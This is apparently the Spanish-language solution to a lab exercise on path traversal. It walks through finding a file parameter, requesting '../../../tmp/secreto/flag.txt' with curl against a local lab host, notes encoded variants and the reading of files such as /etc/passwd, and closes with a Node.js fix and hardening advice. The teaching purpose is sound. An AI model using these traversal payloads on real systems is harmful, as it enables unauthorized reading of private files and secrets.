## Solución

1. La lista de documentos enlaza a `/ver?archivo=faq.txt`: el nombre del archivo viaja en la URL.
2. El documento `acerca.txt` revela que los archivos internos están en `/tmp/secreto`.
3. El servidor une la carpeta `docs` con tu texto sin validarlo. La carpeta real es `/srv/app/docs`, así que subir tres niveles llega a `/`:

   ```
   /srv/app/docs/../../../tmp/secreto/flag.txt  →  /tmp/secreto/flag.txt
   ```

4. Pide esa ruta:

   ```bash
   curl -s "http://<tu-sesion>.lab.localhost:8081/ver?archivo=../../../tmp/secreto/flag.txt"
   ```

## Qué aprendiste

- Cualquier valor que el usuario controla y que termina en una ruta de archivo es una superficie de ataque.
- `../` permite salir del directorio previsto; también existen variantes codificadas (`..%2f`) y rutas absolutas.
- Con path traversal se pueden leer archivos del sistema (`/etc/passwd`, configuraciones, claves, código fuente).

## Cómo se evita

Resuelve la ruta final y verifica que sigue dentro del directorio base:

```js
const base = path.resolve(DOCS);
const ruta = path.resolve(base, nombre);
if (!ruta.startsWith(base + path.sep)) return res.status(400)
```

Mejor aún: no aceptes nombres de archivo libres, usa una lista permitida de identificadores. Ejecuta el servicio con un usuario que solo pueda leer lo necesario.
